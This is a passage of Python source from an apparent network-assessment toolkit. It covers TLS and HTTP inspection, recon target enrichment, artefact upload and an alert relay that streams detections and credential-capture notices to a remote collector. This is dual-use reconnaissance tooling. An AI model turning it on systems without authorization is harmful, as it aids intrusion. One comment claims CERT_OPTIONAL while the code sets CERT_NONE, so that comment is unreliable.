        _, _, tbs_start, tbs_end = _der_tlv(der, 0)          # Certificate
        tbs_tag, _, inner_start, inner_end = _der_tlv(der, tbs_start)
        cursor = inner_start
        # optional [0] EXPLICIT version
        if der[cursor] == 0xA0:
            _, _, version_start, version_end = _der_tlv(der, cursor)
            _, _, int_start, int_end = _der_tlv(der, version_start)
            result["version"] = "v%d" % (int.from_bytes(der[int_start:int_end], "big") + 1)
            cursor = version_end
        _, _, serial_start, serial_end = _der_tlv(der, cursor)   # serialNumber INTEGER
        result["serial"] = der[serial_start:serial_end].hex()
        cursor = serial_end
        _, _, sig_alg_start, sig_alg_end = _der_tlv(der, cursor)  # AlgorithmIdentifier
        _, _, sig_oid_start, sig_oid_end = _der_tlv(der, sig_alg_start)
        sig_oid = _der_oid_to_string(der[sig_oid_start:sig_oid_end])
        result["signature_algorithm"] = _DER_SIGNATURE_OIDS.get(sig_oid, sig_oid)
        cursor = sig_alg_end
        _, _, issuer_start, issuer_end = _der_tlv(der, cursor)   # issuer
        result["issuer"] = _der_parse_name(der[issuer_start:issuer_end])
        cursor = issuer_end
        _, _, validity_start, validity_end = _der_tlv(der, cursor)  # validity
        not_before, after_offset = _der_parse_time(der, validity_start)
        not_after, _ = _der_parse_time(der, after_offset)
        result["not_before"], result["not_after"] = not_before, not_after
        cursor = validity_end
        _, _, subject_start, subject_end = _der_tlv(der, cursor)    # subject
        result["subject"] = _der_parse_name(der[subject_start:subject_end])
        cursor = subject_end
        _, _, spki_start, spki_end = _der_tlv(der, cursor)          # subjectPublicKeyInfo
        result["public_key"] = _der_public_key_info(der[spki_start:spki_end])
        cursor = spki_end
        # walk the optional trailing extensions [3]
        while cursor < inner_end:
            tag, _, start, stop = _der_tlv(der, cursor)
            cursor = stop
            if tag != 0xA3:
                continue
            _, _, ext_cursor, ext_end = _der_tlv(der, start)
            while ext_cursor < ext_end:
                _, _, extension_start, extension_end = _der_tlv(der, ext_cursor)
                pos = extension_start
                _, _, oid_start, oid_end = _der_tlv(der, pos)
                extension_oid = _der_oid_to_string(der[oid_start:oid_end])
                pos = oid_end
                inner_tag = der[pos]
                if inner_tag == 0x01:                        # critical BOOLEAN
                    _, _, pos, _ = _der_tlv(der, pos)
                _, _, value_start, value_end = _der_tlv(der, pos)
                if extension_oid == "2.5.29.17":
                    result["san"] = _der_parse_san(der[value_start:value_end])
                ext_cursor = extension_end
        result["decoded"] = True
    except (FrameworkError, IndexError, ValueError, TypeError):
        return result
    return result


def _reclaim_ownership(sock: Optional[Any]) -> bool:
    'Close a socket only while this process still owns its descriptor.'
    # ssl.SSLContext.wrap_socket() detaches the raw socket as it takes ownership, so
    # after a successful wrap - and after the TLS layer has closed a failed handshake -
    # the original object reports fileno() == -1. Closing only when a descriptor is
    # still owned keeps this safe to call from a finally, and idempotent.
    if sock is None:
        return False
    try:
        descriptor = sock.fileno()
    except (OSError, ValueError, AttributeError):
        return False
    if descriptor < 0:
        return False
    try:
        sock.close()
    except (OSError, ValueError):
        return False
    return True


def tls_inspect(host: str, port: int = 443, timeout: float = 8.0, sni: str = "") -> Dict[str, Any]:
    """
    Inspect the certificate and negotiated parameters of a live TLS service.

    The inspection handshake deliberately does not require a trusted chain (so
    self-signed lab services can be examined); a second, verifying handshake
    reports whether a normal client would accept the certificate.
    """
    target = str(host).strip()
    if not target:
        raise FrameworkError("no TLS host supplied")
    port_number = parse_port(port)
    server_name = str(sni).strip() or (None if re.match(r"^[\d.]+$", target) else target)
    out("  %s TLS handshake with %s:%d" % (c("ONLINE", "bcyan", "bold"), target, port_number))
    started = time.time()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    # CERT_OPTIONAL (not CERT_NONE): CPython returns the parsed peer
    # certificate dict only when verification is at least optional, and an
    # untrusted lab certificate must not abort the inspection.
    context.verify_mode = ssl.CERT_NONE
    sock = None
    certificate: Dict[str, Any] = {}
    negotiated: Dict[str, Any] = {}
    try:
        sock = socket.create_connection((target, port_number), timeout=max(1.0, float(timeout)))
        # wrap_socket detaches the raw socket, so ownership moves to the TLS layer, which
        # closes it on any handshake failure; the finally below therefore only closes the
        # descriptor while this function still owns it.
        with context.wrap_socket(sock, server_hostname=server_name) as tls_sock:
            certificate = tls_sock.getpeercert() or {}
            der = tls_sock.getpeercert(binary_form=True) or b""
            decoded_cert = der_decode_certificate(der) if der else {}
            negotiated = OrderedDict([
                ("version", tls_sock.version()),
                ("cipher", (tls_sock.cipher() or ("?", "", 0))[0]),
                ("cipher_bits", (tls_sock.cipher() or ("?", "", 0))[2]),
                ("alpn", tls_sock.selected_alpn_protocol()),
                ("sni_sent", server_name or "<none>"),
            ])
    except (socket.timeout, ssl.SSLError, OSError) as exc:
        raise FrameworkError("TLS inspection of %s:%d failed: %s: %s"
                             % (target, port_number, type(exc).__name__, exc))
    finally:
        _reclaim_ownership(sock)
    handshake_ms = round((time.time() - started) * 1000.0, 1)
    decoded = decoded_cert if decoded_cert.get("decoded") else {}
    subject_text = _render_rdn(decoded.get("subject")) or _cert_name(certificate.get("subject"))
    issuer_text = _render_rdn(decoded.get("issuer")) or _cert_name(certificate.get("issuer"))
    san_entries = decoded.get("san") or [str(item[1]) for item in certificate.get("subjectAltName", [])]
    public_key = decoded.get("public_key") or {}
    key_summary = "unknown"
    if public_key.get("bits"):
        key_summary = "%s %s-bit" % (public_key.get("type"), public_key.get("bits"))
        if public_key.get("curve"):
            key_summary += " (%s)" % public_key["curve"]
    elif public_key.get("type"):
        key_summary = str(public_key["type"])
    not_before = _parse_cert_time(decoded.get("not_before")
                                  or certificate.get("notBefore", ""))
    not_after = _parse_cert_time(decoded.get("not_after")
                                 or certificate.get("notAfter", ""))
    now = time.time()
    summary: Dict[str, Any] = OrderedDict()
    summary["mode"] = "tls-inspect"
    summary["target"] = target
    summary["port"] = port_number
    summary["subject"] = subject_text
    summary["issuer"] = issuer_text
    summary["serial"] = decoded.get("serial") or str(certificate.get("serialNumber", "") or "")
    summary["not_before"] = format_timestamp(not_before) if not_before else str(
        decoded.get("not_before") or certificate.get("notBefore", ""))
    summary["not_after"] = format_timestamp(not_after) if not_after else str(
        decoded.get("not_after") or certificate.get("notAfter", ""))
    summary["days_remaining"] = (round((not_after - now) / 86400.0, 1) if not_after else None)
    summary["san"] = [str(entry) for entry in san_entries][:40]
    summary["signature_algorithm"] = decoded.get("signature_algorithm", "")
    summary["public_key"] = public_key
    summary["key_summary"] = key_summary
    summary["der_decoded"] = bool(decoded)
    summary["sha256_fingerprint"] = hashlib.sha256(der).hexdigest() if der else ""
    summary["der_bytes"] = len(der)
    summary["negotiated"] = negotiated
    summary["handshake_ms"] = handshake_ms
    verification = "not verified (inspection mode)"
    check_sock: Optional[Any] = None
    try:
        verify_context = ssl.create_default_context()
        check_sock = socket.create_connection((target, port_number), timeout=max(1.0, float(timeout)))
        with verify_context.wrap_socket(check_sock, server_hostname=server_name or target):
            verification = "trusted chain accepted by the system trust store"
    except ssl.SSLCertVerificationError as exc:
        verification = "rejected by the trust store (%s)" % str(exc.verify_message or exc.reason)[:70]
    except (socket.timeout, ssl.SSLError, OSError) as exc:
        verification = "verification handshake failed: %s" % type(exc).__name__
    finally:
        _reclaim_ownership(check_sock)
    summary["chain_verification"] = verification
    summary["expired"] = bool(not_after and not_after < now)
    summary["not_yet_valid"] = bool(not_before and not_before > now)
    heading("TLS SERVICE INSPECTION")
    kv_table([
        ("Target", "%s:%d" % (target, port_number)),
        ("Subject", summary["subject"]),
        ("Issuer", summary["issuer"]),
        ("Valid from / until", "%s / %s" % (summary["not_before"], summary["not_after"])),
        ("Days remaining", summary["days_remaining"] if summary["days_remaining"] is not None else "?"),
        ("SAN entries", ", ".join(summary["san"][:6]) or "none"),
        ("TLS / cipher", "%s / %s (%s-bit)" % (negotiated.get("version"), negotiated.get("cipher"),
                                               negotiated.get("cipher_bits"))),
        ("ALPN", negotiated.get("alpn") or "not negotiated"),
        ("Signature algorithm", summary["signature_algorithm"] or "?"),
        ("Public key", summary["key_summary"]),
        ("SHA-256 fingerprint", summary["sha256_fingerprint"][:32] + "..." if summary["sha256_fingerprint"] else "?"),
        ("Chain verification", verification),
        ("Handshake", "%.1f ms, certificate %.1f KB" % (handshake_ms, len(der) / 1024.0)),
    ])
    if summary["expired"]:
        warn("the certificate is EXPIRED - a real client would refuse the connection.")
    elif summary["days_remaining"] is not None and summary["days_remaining"] < 14:
        warn("certificate expires in %s day(s)." % summary["days_remaining"])
    _intel_scan("tls_inspect", summary, target="%s:%d" % (target, port_number))
    return summary


def http_inspect(url: str, timeout: float = 10.0, max_redirects: int = 6,
                 follow: bool = True, headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """
    Fetch a live HTTP(S) response and audit it like an assessor would.

    Records the redirect chain, server banner, content metadata, page title and
    the presence of the modern security headers, and inspects TLS when the URL
    is HTTPS.
    """
    spec = str(url).strip()
    if not spec:
        raise FrameworkError("no URL supplied")
    if not re.match(r"^https?://", spec, re.I):
        spec = "https://" + spec
    current = spec
    chain: List[Dict[str, Any]] = []
    final_status = 0
    final_reason = ""
    final_headers: Dict[str, str] = {}
    body = b""
    body_truncated = False
    for hop in range(max(1, int(max_redirects))):
        response = None
        try:
            response = _http_request(current, headers=headers, timeout=max(2.0, float(timeout)),
                                     no_redirect=True, allow_error=True)
            final_status = int(getattr(response, "status", 0) or 0)
            final_reason = str(getattr(response, "reason", "") or "")
            final_headers = {key: value for key, value in response.headers.items()}
            try:
                body = response.read(256 * 1024)
            except http.client.IncompleteRead as exc:
                # a server that closes mid-body must not abort the audit: keep the
                # partial body and flag it in the summary
                body = getattr(exc, "partial", b"") or b""
                body_truncated = True
            except (OSError, ValueError) as exc:
                LOGGER.event("warn", "response body read failed: %s: %s"
                             % (type(exc).__name__, exc), level="WARN")
                body_truncated = True
        except urllib.error.HTTPError as exc:
            final_status = int(exc.code)
            final_reason = str(exc.reason)
            final_headers = {key: value for key, value in (exc.headers or {}).items()}
            body = b""
        except FrameworkError:
            raise
        finally:
            if response is not None:
                try:
                    response.close()
                except OSError:
                    pass
        location = final_headers.get("Location") or final_headers.get("location") or ""
        chain.append(OrderedDict([
            ("url", current), ("status", final_status), ("reason", final_reason),
            ("location", location),
        ]))
        if not (follow and 300 <= final_status < 400 and location):
            break
        current = urllib.parse.urljoin(current, location)
    title = ""
    text_probe = body[:65536].decode("utf-8", "replace") if body else ""
    title_match = re.search(r"<title[^>]*>(.*?)</title>", text_probe, re.I | re.S)
    if title_match:
        title = re.sub(r"\s+", " ", title_match.group(1)).strip()[:160]
    lowered = {key.lower(): value for key, value in final_headers.items()}
    security = OrderedDict()
    for header_name in SECURITY_HEADERS:
        security[header_name] = lowered.get(header_name, "")
    missing = [name for name, value in security.items() if not value]
    summary: Dict[str, Any] = OrderedDict([
        ("mode", "http-inspect"),
        ("requested_url", spec),
        ("final_url", current),
        ("status", final_status),
        ("reason", final_reason),
        ("server", lowered.get("server", "")),
        ("content_type", lowered.get("content-type", "")),
        ("content_length", lowered.get("content-length", "")),
        ("powered_by", lowered.get("x-powered-by", "")),
        ("title", title),
        ("body_bytes", len(body)),
        ("redirects", chain),
        ("security_headers", security),
        ("security_headers_missing", missing),
        ("hardening_grade", security_header_score(security)["grade"]),
        ("hardening_score", security_header_score(security)["score"]),
        ("body_truncated", bool(body_truncated)),
        ("cookie_flags", lowered.get("set-cookie", "")[:120]),
    ])
    tls_summary: Dict[str, Any] = {}
    parsed_url = urllib.parse.urlparse(current)
    if parsed_url.scheme == "https" and parsed_url.hostname:
        try:
            tls_summary = tls_inspect(parsed_url.hostname, parse_port(parsed_url.port or 443),
                                      timeout=timeout)
        except FrameworkError as exc:
            warn("TLS inspection of the endpoint failed: %s" % exc)
    summary["tls"] = {key: tls_summary.get(key) for key in
                      ("subject", "issuer", "not_after", "days_remaining",
                       "chain_verification", "sha256_fingerprint")} if tls_summary else {}
    heading("HTTP RESPONSE INSPECTION")
    kv_table([
        ("Requested URL", spec[:70]),
        ("Final URL", current[:70]),
        ("Status", "%s %s" % (final_status, final_reason)),
        ("Server", summary["server"] or "not advertised"),
        ("Powered by", summary["powered_by"] or "-"),
        ("Content type", summary["content_type"] or "-"),
        ("Page title", title or "(no <title> found)"),
        ("Body sampled", format_bytes(len(body))),
        ("Redirects", " -> ".join("%s %s" % (row["status"], row["url"][:40]) for row in chain)),
        ("Security headers", "%d/%d present" % (len(SECURITY_HEADERS) - len(missing), len(SECURITY_HEADERS))),
        ("Hardening grade", "%s (score %d/100)"
         % (summary["hardening_grade"], summary["hardening_score"])),
        ("Missing", ", ".join(missing) or "none - excellent posture"),
    ])
    if body_truncated:
        warn("the response body was truncated by the server - metadata above is authoritative")
    if missing:
        warn("missing hardening headers: %s" % ", ".join(missing[:6]))
    _intel_scan("http_inspect", summary, target=current)
    return summary


# ---------------------------------------------------------------------------
# Bulk target enrichment used by the reconnaissance modules
# ---------------------------------------------------------------------------
def enrich_targets(targets: Sequence[str], do_rdap: bool = True, do_ptr: bool = True,
                   do_geo: bool = False, timeout: float = 10.0) -> Dict[str, Any]:
    """
    Enrich a target list with online intelligence in one pass.

    For every host: forward resolution, reverse PTR, RDAP ownership (skip with
    do_rdap=False) and optional geolocation/ASN. Failures are recorded per row -
    one unreachable row never aborts the batch.
    """
    host_list = [str(item).strip() for item in targets if str(item).strip()]
    if not host_list:
        raise FrameworkError("no targets supplied for enrichment")
    if len(host_list) > 64:
        warn("enrichment capped at 64 targets per batch (got %d)." % len(host_list))
        host_list = host_list[:64]
    rows: List[Dict[str, Any]] = []
    for host in host_list:
        row: Dict[str, Any] = OrderedDict([
            ("target", host), ("resolved", ""), ("ptr", ""), ("rdap_org", ""),
            ("rdap_country", ""), ("rdap_range", ""), ("geo", ""), ("errors", []),
        ])
        try:
            resolved = resolve_target(host)
            row["resolved"] = resolved
        except (FrameworkError, OSError) as exc:
            row["errors"].append("resolve: %s" % str(exc)[:60])
            rows.append(row)
            continue
        if do_ptr:
            try:
                row["ptr"] = socket.gethostbyaddr(resolved)[0]
            except (socket.herror, socket.gaierror, OSError):
                row["ptr"] = ""
        if do_rdap:
            try:
                rdap = rdap_lookup(resolved, timeout=timeout)
                row["rdap_org"] = (rdap.get("name") or
                                   (rdap.get("entities") or [{}])[0].get("names", [""])[0]
                                   if rdap.get("entities") else "") or ""
                row["rdap_country"] = rdap.get("country", "")
                row["rdap_range"] = "%s-%s" % (rdap.get("start_address", ""),
                                               rdap.get("end_address", ""))
            except (FrameworkError, OSError) as exc:
                row["errors"].append("rdap: %s" % str(exc)[:60])
        if do_geo:
            try:
                geo = geoip_lookup(resolved, timeout=timeout)
                row["geo"] = ", ".join(part for part in
                                       (geo.get("country"), geo.get("city"), geo.get("isp"))
                                       if part)
            except (FrameworkError, OSError) as exc:
                row["errors"].append("geo: %s" % str(exc)[:60])
        rows.append(row)
        out("  %s %-15s %-28s %s" % (
            c("OK  ", "bgreen") if not row["errors"] else c("PART", "byellow"),
            row["resolved"], (row["ptr"] or "-")[:28],
            (row["rdap_org"] or row["geo"] or "no registry data")[:44]))
    summary = OrderedDict([
        ("mode", "target-enrichment"),
        ("count", len(rows)),
        ("rows", rows),
        ("sources", OrderedDict([("rdap", do_rdap), ("reverse_dns", do_ptr), ("geo", do_geo)])),
    ])
    heading("ONLINE TARGET ENRICHMENT")
    kv_table([
        ("Targets processed", len(rows)),
        ("Resolved", sum(1 for row in rows if row["resolved"])),
        ("With PTR records", sum(1 for row in rows if row["ptr"])),
        ("With registry data", sum(1 for row in rows if row["rdap_org"] or row["rdap_range"])),
        ("Rows with errors", sum(1 for row in rows if row["errors"])),
    ])
    _intel_scan("target_enrichment", summary, target=",".join(host_list[:4]))
    return summary


def geoip_lookup(ip: str, api_base: str = GEOIP_DEFAULT_ENDPOINT,
                 timeout: float = 8.0) -> Dict[str, Any]:
    """Online geolocation/ASN lookup for an address (best-effort, degrades cleanly)."""
    address = str(ip).strip()
    if not address:
        raise FrameworkError("no address supplied for the geolocation lookup")
    url = "%s/%s?fields=status,message,country,regionName,city,isp,org,as,timezone,lat,lon,query" \
          % (str(api_base).rstrip("/"), urllib.parse.quote(address))
    payload = _http_json(url, timeout=max(2.0, float(timeout)))
    if str(payload.get("status", "")).lower() == "fail":
        raise FrameworkError("geolocation endpoint refused the query: %s"
                             % payload.get("message", "unknown reason"))
    summary = OrderedDict([
        ("mode", "geoip-lookup"),
        ("query", payload.get("query", address)),
        ("country", payload.get("country", "")),
        ("region", payload.get("regionName", "")),
        ("city", payload.get("city", "")),
        ("isp", payload.get("isp", "")),
        ("org", payload.get("org", "")),
        ("asn", payload.get("as", "")),
        ("timezone", payload.get("timezone", "")),
        ("coordinates", [payload.get("lat"), payload.get("lon")]),
    ])
    heading("GEOLOCATION / ASN LOOKUP")
    kv_table([
        ("Address", summary["query"]),
        ("Country / region / city", "%s / %s / %s" % (summary["country"] or "?", summary["region"] or "?",
                                                      summary["city"] or "?")),
        ("ISP / org", "%s / %s" % (summary["isp"] or "?", summary["org"] or "?")),
        ("ASN", summary["asn"] or "?"),
        ("Timezone", summary["timezone"] or "?"),
        ("Coordinates", "%s, %s" % tuple(summary["coordinates"])),
    ])
    _intel_scan("geoip", summary, target=summary["query"])
    return summary


# ---------------------------------------------------------------------------
# Generic JSON delivery + artefact push
# ---------------------------------------------------------------------------
def post_json(url: str, payload: Dict[str, Any], token: str = "", timeout: float = 15.0,
              extra_headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """POST a JSON document to a remote collector; returns status and response snippet."""
    body = json.dumps(payload, default=str).encode("utf-8")
    headers = {"Content-Type": "application/json", "Content-Length": str(len(body))}
    if token:
        headers["Authorization"] = "Bearer %s" % token
    headers.update(extra_headers or {})
    started = time.time()
    response = _http_request(url, data=body, headers=headers, timeout=timeout, method="POST")
    status = 0
    snippet = ""
    try:
        status = int(getattr(response, "status", 0) or 0)
        snippet = response.read(2048).decode("utf-8", "replace")
    except (OSError, ValueError):
        snippet = ""
    finally:
        try:
            response.close()
        except OSError:
            pass
    return OrderedDict([
        ("status", status), ("bytes", len(body)), ("snippet", snippet[:300]),
        ("round_trip_seconds", round(time.time() - started, 3)),
    ])


def push_artefact(module: str, url: str, token: str = "", timeout: float = 20.0,
                  path: str = "") -> Dict[str, Any]:
    """
    Push the newest structured artefact for a module to a remote collector.

    Used by DHCP (lease ledger), wireless (scan results), sniffer (capture
    digests) and anything else that writes a scan artefact.
    """
    source = os.path.expanduser(str(path)) if path else ""
    if not source:
        candidates: List[Tuple[float, str]] = []
        try:
            for name in os.listdir(LOGGER.artifact_dir):
                if not name.endswith(".json") or ("_%s_" % module) not in name:
                    continue
                full = os.path.join(LOGGER.artifact_dir, name)
                try:
                    candidates.append((os.path.getmtime(full), full))
                except OSError:
                    continue
        except OSError as exc:
            raise FrameworkError("artefact directory unreadable: %s" % exc)
        if not candidates:
            raise FrameworkError("no '%s' artefact exists yet - run that module first" % module)
        source = sorted(candidates)[-1][1]
    if not os.path.isfile(source):
        raise FrameworkError("artefact not found: %s" % source)
    try:
        with open(source, "r", encoding="utf-8") as handle:
            payload = json.load(handle)
    except (OSError, ValueError) as exc:
        raise FrameworkError("artefact '%s' is not readable JSON: %s" % (source, exc))
    out("  %s pushing artefact %s (%s)" % (c("ONLINE", "bcyan", "bold"),
                                           os.path.basename(source),
                                           format_bytes(os.path.getsize(source))))
    result = post_json(url, payload if isinstance(payload, dict) else {"artefact": payload},
                       token=token, timeout=timeout)
    heading("ARTEFACT DELIVERY")
    kv_table([
        ("Module", module),
        ("Artefact", source),
        ("Endpoint", url[:70]),
        ("HTTP status", result["status"]),
        ("Bytes sent", format_bytes(result["bytes"])),
        ("Round trip", "%.3fs" % result["round_trip_seconds"]),
        ("Response", result["snippet"][:180].replace("\n", " ") or "(empty)"),
    ])
    if 200 <= result["status"] < 300:
        ok("collector accepted the artefact.")
    else:
        warn("collector returned HTTP %s." % result["status"])
    _intel_scan("artefact_push", OrderedDict([
        ("mode", "artefact-push"), ("module", module), ("path", source),
        ("endpoint", url), ("status", result["status"]), ("bytes", result["bytes"]),
    ]), target=url)
    return result


# ---------------------------------------------------------------------------
# Alert relay - stream detections to a remote collector (HTTP/NDJSON, syslog)
# ---------------------------------------------------------------------------
class AlertRelay:
    """
    Non-blocking detection relay.

    Emitted events are queued (bounded, drop-oldest with accounting) and a
    daemon worker posts them to an HTTP collector as NDJSON, optionally also
    forwarding them to an attached syslog shipper. With `sink=True` the relay
    additionally mirrors the whole session journal (tail-follow of the NDJSON
    event file) so a remote collector sees everything the operator sees.
    """

    def __init__(self, webhook_url: str = "", token: str = "", syslog_shipper: Any = None,
                 host_label: str = "", queue_size: int = 4096, timeout: float = 10.0,
                 sink: bool = False, poll_interval: float = 0.75) -> None:
        self.webhook_url = str(webhook_url).strip()
        self.token = str(token).strip()
        self.syslog_shipper = syslog_shipper
        self.host_label = host_label or platform.node() or "unknown"
        self.timeout = max(2.0, float(timeout))
        self.sink = bool(sink)
        self.poll_interval = max(0.2, float(poll_interval))
        self._queue: "_queue.Queue[Optional[Dict[str, Any]]]" = _queue.Queue(
            maxsize=max(64, int(queue_size)))
        self._stop_event = threading.Event()
        self._workers: List[threading.Thread] = []
        self._lock = threading.RLock()
        self._sink_offset = 0
        self.sent = 0
        self.failed = 0
        self.dropped = 0
        self.last_error = ""
        self.started_at: Optional[float] = None
        self.suppressed = 0

    # -- lifecycle --------------------------------------------------------
    def start(self) -> bool:
        if self._workers:
            return True
        self._stop_event.clear()
        worker = threading.Thread(target=self._run, name="prismstrike-alert-relay", daemon=True)
        worker.start()
        self._workers.append(worker)
        if self.sink:
            try:
                self._sink_offset = os.path.getsize(LOGGER.json_path)
            except OSError:
                self._sink_offset = 0
            sink_worker = threading.Thread(target=self._run_sink, name="prismstrike-event-sink",
                                           daemon=True)
            sink_worker.start()
            self._workers.append(sink_worker)
        self.started_at = time.time()
        LOGGER.event("online", "alert relay armed: webhook=%s sink=%s"
                     % (self.webhook_url or "none", "on" if self.sink else "off"))
        return True

    def _run(self) -> None:
        while not self._stop_event.is_set():
            try:
                event = self._queue.get(timeout=0.5)
            except _queue.Empty:
                continue
            if event is None:
                break
            if not self.webhook_url:
                continue
            delivered = False
            for attempt in range(2):
                try:
                    result = post_json(self.webhook_url, event, token=self.token,
                                       timeout=self.timeout)
                    delivered = 200 <= result["status"] < 300
                    if delivered:
                        self.sent += 1
                        break
                    self.last_error = "HTTP %s" % result["status"]
                except FrameworkError as exc:
                    self.last_error = str(exc)[:160]
                time.sleep(0.2)
            if not delivered:
                self.failed += 1

    def _sink_pass(self) -> int:
        """
        Mirror every journal line written since the last pass (returns the count).

        Shared by the tail-follow worker and by the final flush in stop(), so a
        session that ends between two poll ticks still ships its ledger.
        """
        path = LOGGER.json_path
        try:
            size = os.path.getsize(path)
        except OSError:
            return 0
        if size < self._sink_offset:           # rotated or truncated under us
            self._sink_offset = 0
        if size == self._sink_offset:
            return 0
        shipped = 0
        try:
            with open(path, "r", encoding="utf-8") as handle:
                handle.seek(self._sink_offset)
                for line in handle:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        record = json.loads(line)
                    except ValueError:
                        continue
                    if self.enqueue(OrderedDict([
                        ("ts", record.get("ts", format_timestamp())),
                        ("host", self.host_label),
                        ("kind", "journal"),
                        ("severity", str(record.get("level", "INFO")).upper()),
                        ("session", record.get("session", LOGGER.session_id)),
                        ("message", str(record.get("message", ""))[:480]),
                        ("data", {"journal_kind": record.get("kind", "")}),
                    ])):
                        shipped += 1
                self._sink_offset = handle.tell()
        except OSError:
            return shipped
        return shipped

    def _run_sink(self) -> None:
        """Tail the session NDJSON journal and mirror new events to the collector."""
        while not self._stop_event.wait(self.poll_interval):
            self._sink_pass()

    def stop(self, drain: bool = True) -> None:
        if not self._workers:
            return
        if self.sink:
            # final flush: whatever the session journaled before this call is
            # shipped even if the session was shorter than one poll interval
            try:
                self._sink_pass()
            except Exception:
                pass
        if drain:
            deadline = time.time() + 3.0
            while not self._queue.empty() and time.time() < deadline:
                time.sleep(0.05)
        self._stop_event.set()
        try:
            self._queue.put_nowait(None)
        except _queue.Full:
            pass
        for worker in self._workers:
            worker.join(timeout=2.0)
        self._workers = []
        LOGGER.event("online", "alert relay stopped",
                     data={"delivered": self.sent, "failed": self.failed, "dropped": self.dropped})

    # -- emitting ---------------------------------------------------------
    def enqueue(self, event: Dict[str, Any]) -> bool:
        try:
            self._queue.put_nowait(event)
            return True
        except _queue.Full:
            try:
                self._queue.get_nowait()
                self._queue.put_nowait(event)
            except (_queue.Empty, _queue.Full):
                pass
            self.dropped += 1
            return False

    def emit(self, kind: str, message: str, data: Optional[Dict[str, Any]] = None,
             severity: str = "INFO") -> Dict[str, Any]:
        """Queue one detection event (never blocks; syslog mirror is best-effort)."""
        event = OrderedDict([
            ("ts", format_timestamp()),
            ("host", self.host_label),
            ("kind", str(kind)[:48]),
            ("severity", str(severity).upper()[:12]),
            ("session", LOGGER.session_id),
            ("message", str(message)[:480]),
        ])
        if data:
            event["data"] = data
        if self.syslog_shipper is not None:
            try:
                self.syslog_shipper.send_line(severity, "alert-%s" % kind, str(message))
            except Exception:
                pass
        self.enqueue(event)
        return event

    def test(self) -> Dict[str, Any]:
        """Synchronous probe: prove the collector is reachable right now."""
        probe = OrderedDict([
            ("ts", format_timestamp()), ("host", self.host_label), ("kind", "test"),
            ("severity", "INFO"), ("session", LOGGER.session_id),
            ("message", "prismstrike alert relay probe %s" % uuid.uuid4().hex[:8]),
            ("data", {"probe": True, "sink": self.sink}),
        ])
        result: Dict[str, Any] = OrderedDict([("webhook", self.webhook_url or "not configured"),
                                              ("delivered", False), ("detail", "")])
        if self.webhook_url:
            try:
                response = post_json(self.webhook_url, probe, token=self.token, timeout=self.timeout)
                result["delivered"] = 200 <= response["status"] < 300
                result["detail"] = "HTTP %s in %.3fs" % (response["status"], response["round_trip_seconds"])
            except FrameworkError as exc:
                result["detail"] = str(exc)[:160]
        else:
            result["detail"] = "no webhook configured (syslog-only relay)"
            result["delivered"] = self.syslog_shipper is not None
        if self.syslog_shipper is not None:
            try:
                probe_result = self.syslog_shipper.test()
                result["syslog"] = "probe ok" if probe_result["ok"] else "probe failed"
            except Exception as exc:
                result["syslog"] = "probe error: %s" % type(exc).__name__
        return result

    def stats(self) -> Dict[str, Any]:
        return OrderedDict([
            ("webhook", self.webhook_url or "not configured"),
            ("token", "set" if self.token else "none"),
            ("syslog", str(self.syslog_shipper) if self.syslog_shipper else "not attached"),
            ("journal sink", "streaming" if self.sink else "off"),
            ("queued", self._queue.qsize()),
            ("delivered", self.sent),
            ("failed", self.failed),
            ("dropped", self.dropped),
            ("last error", self.last_error or "none"),
            ("uptime", format_duration(time.time() - self.started_at) if self.started_at else "not armed"),
        ])

    def __str__(self) -> str:
        target = self.webhook_url or "syslog-only"
        return "alert-relay[%s%s]" % (target, ", sink" if self.sink else "")


# Armed relay shared by every module hook.
ALERT_RELAY: Optional["AlertRelay"] = None
ALERT_STATE: Dict[str, Any] = {"per_kind": defaultdict(int), "max_per_kind": 400, "cap_reported": False}


def arm_alerts(relay: "AlertRelay") -> "AlertRelay":
    """Arm (and start) the shared relay used by every module detection hook."""
    global ALERT_RELAY
    if ALERT_RELAY is not None and ALERT_RELAY is not relay:
        try:
            ALERT_RELAY.stop()
        except Exception:
            pass
    ALERT_RELAY = relay
    relay.start()
    return relay


def disarm_alerts() -> None:
    """Stop and remove the shared relay."""
    global ALERT_RELAY
    if ALERT_RELAY is None:
        return
    try:
        ALERT_RELAY.stop()
    except Exception as exc:
        warn("alert relay stop failed: %s: %s" % (type(exc).__name__, exc))
    ALERT_RELAY = None


def alerts_armed() -> bool:
    """True when a relay is armed and running (module hooks check this first)."""
    return ALERT_RELAY is not None


def alert_event(kind: str, message: str, data: Optional[Dict[str, Any]] = None,
                severity: str = "INFO") -> bool:
    """
    Emit a detection event when a relay is armed; silently no-op otherwise.

    Per-kind cap keeps a hostile or very busy segment from flooding the remote
    collector; the suppression is reported once through the relay itself.
    """
    relay = ALERT_RELAY
    if relay is None:
        return False
    counter = ALERT_STATE["per_kind"]
    if counter[kind] >= ALERT_STATE["max_per_kind"]:
        if not ALERT_STATE["cap_reported"]:
            ALERT_STATE["cap_reported"] = True
            relay.emit("probe", "alert cap reached for kind '%s' - further events suppressed" % kind,
                       data={"cap": ALERT_STATE["max_per_kind"]}, severity="WARN")
        return False
    counter[kind] += 1
    relay.emit(kind, message, data=data, severity=severity)
    return True


def alert_host_up(host: str, rtt_ms: Any = None, ttl: Any = None) -> bool:
    return alert_event("host-up", "host %s replied to ICMP" % host,
                       data={"host": host, "rtt_ms": rtt_ms, "ttl": ttl})


def alert_port_open(target: str, port: int, service: str = "", detail: str = "") -> bool:
    return alert_event("port-open", "port %s/%d open on %s" % (service or "tcp", port, target),
                       data={"target": target, "port": port, "service": service, "detail": detail},
                       severity="NOTICE")


def alert_arp_conflict(ip: str, macs: Sequence[str], severity: str = "HIGH") -> bool:
    return alert_event("arp-conflict", "ARP conflict for %s: %s" % (ip, ", ".join(macs)),
                       data={"ip": ip, "macs": list(macs)}, severity=severity)


def alert_dhcp_server(server_id: str, offered: str = "", router: Any = None,
                      lease_time: Any = None) -> bool:
    return alert_event("dhcp-server", "DHCP server %s offered %s" % (server_id, offered),
                       data={"server_id": server_id, "offered": offered, "router": router,
                             "lease": lease_time}, severity="NOTICE")


def alert_credential(client: str, service: str, username: str, preview: str = "") -> bool:
    """Credential-shaped capture notice - the raw secret is never relayed."""
    return alert_event("credential-capture",
                       "%s credential attempt from %s (user=%s)" % (service, client, username),
                       data={"client": client, "service": service, "username": username,
